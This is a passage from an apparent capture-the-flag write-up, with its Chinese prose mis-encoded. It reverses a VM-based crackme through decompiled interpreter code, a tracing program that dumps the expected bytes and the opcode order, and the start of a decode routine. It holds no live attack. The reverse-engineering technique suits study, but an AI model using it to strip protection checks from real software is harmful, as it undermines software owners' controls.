+= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = input[v8] - LOBYTE(str_local[v9 + <span class="number">1</span>]);</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = str_local[v9 + <span class="number">1</span>] ^ input[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = str_local[v9 + <span class="number">1</span>] * input[v8];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v3[v7] != str_local[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        input[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(input);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = input[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = input[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹ä¸‹operadçš„æ“ä½œï¼š</p><p>case7å½“ä¸ç­‰çš„æ—¶å€™ç›´æ¥é€€å‡ºï¼Œv3ç”±v4å¾—å‡ºï¼Œv4ç”±è¾“å…¥çš„inputå’Œæœ¬åœ°çš„local_strç»è¿‡è¿ç®—å¾—å‡ºã€‚</p><p>inputâ€“&gt;v4â€”&gt;v3ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ ¹æ®local_strç®—å‡ºv3ï¼Œç„¶åç®—v4ï¼Œæœ€åflagã€‚</p><p>case10çš„æ—¶å€™è¾“å…¥çš„æ˜¯å›ºå®šé•¿åº¦15.</p><p>è¾“å‡ºçœ‹ä¸‹ä¸localstræ¯”è¾ƒçš„æ˜¯é‚£äº›indexï¼Œå¹¶ä¸”è®°å½•æ¯æ¬¡indexçš„å€¼ï¼ˆåŒ…æ‹¬æ²¡æœ‰æ¯”è¾ƒçš„index</p><p>æ‰€ä»¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">read</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;string:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(Str) != <span class="number">15</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;WRONG!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *str_local, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> order[<span class="number">114</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">100</span>]; <span class="comment">// [esp+13h] [ebp-E5h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> v3[<span class="number">100</span>];    <span class="comment">// [esp+77h] [ebp-81h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> v4;         <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">    <span class="keyword">int</span> v5;          <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v6;          <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">    <span class="keyword">int</span> v7;          <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">    <span class="keyword">int</span> v8;          <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v9;          <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="keyword">while</span> (v9 &lt; a2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (str_local[v9])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            v3[v6] = v4;</span><br><span class="line">            ++v9;</span><br><span class="line">            ++v6;</span><br><span class="line">            ++v8;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v4 = str_local[v9 + <span class="number">1</span>] + input[v8];</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v4 = input[v8] - LOBYTE(str_local[v9 + <span class="number">1</span>]);</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            v4 = str_local[v9 + <span class="number">1</span>] ^ input[v8];</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            v4 = str_local[v9 + <span class="number">1</span>] * input[v8];</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            v3[v7] = str_local[v9 + <span class="number">1</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#x,&quot;</span>, v3[v7]);</span><br><span class="line">            ++v7;</span><br><span class="line">            v9 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            input[v5] = v4;</span><br><span class="line">            ++v9;</span><br><span class="line">            ++v5;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            read(input);</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            v4 = input[v8] - <span class="number">1</span>;</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            v4 = input[v8] + <span class="number">1</span>;</span><br><span class="line">            ++v9;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        order[s++] = v9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\né¡ºåº:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> ss = <span class="number">0</span>; ss &lt; <span class="built_in">strlen</span>(order); ss++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x, &quot;</span>, order[ss]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x21</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x18</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x84</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *str = (<span class="keyword">int</span> *)ida_chars;</span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; 100; i++)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;%d &quot;, str[i]);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    vm_operad(str, <span class="number">114</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x22 0x3f 0x34 0x32 0x72 0x33 0x18 0xffffffa7 0x31 0xfffffff1 0x28 0xffffff84 0xffffffc1 0x1e 0x7a </span><br><span class="line">é¡ºåº:</span><br><span class="line">1, 3, 4, 6, 7, 9, 10, 12, 13, 15, 16, 17, 18, 19, 20, 22, 23, 25, 26, 28, 29, 30, 31, 32, 33, 35, 36, 38, 39, 41, 42, 44, 45, 46, 47, 48, 49, 51, 52, 54, 55, 57, 58, </span><br><span class="line">60, 61, 63, 64, 66, 67, 69, 70, 72, 73, 75, 76, 78, 79, 81, 82, 83, 84, 86, 88, 90, 92, 94, 96, 98, 100, 102, 104, 106, 108, 110, 112, 114,</span><br></pre></td></tr></table></figure><p>æ­£å¥½æ¯”è¾ƒäº†15æ¬¡ã€‚</p><p>ç°åœ¨çŸ¥é“äº†æ‰§è¡Œé¡ºåºä»¥åŠæœ‰å…³flagçš„å…³é”®ä¿¡æ¯ã€‚é€†ç€èµ°ä¸€éå°±å¥½ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">vm_decode</span><span class="params">(<span class="keyword">int</span> *opcode,<span class="keyword">int</span> len_114)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> order[<span class="number">100</span>] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span 